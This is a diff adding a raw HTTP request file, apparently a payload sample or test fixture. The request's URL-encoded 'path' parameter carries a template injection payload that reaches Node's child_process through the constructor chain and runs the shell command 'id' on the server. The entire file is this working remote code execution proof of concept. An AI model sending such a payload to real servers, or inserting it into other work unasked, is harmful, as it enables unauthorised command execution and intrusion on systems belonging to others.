@@ -1,0 +1,4 @@
+GET /a?path=%7B%7B%27%27.constructor.constructor%28%27return%2Bprocess%27%29%28%29.mainModule.require%28%27child_process%27%29.execSync%28%27id%27%29%7D%7D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
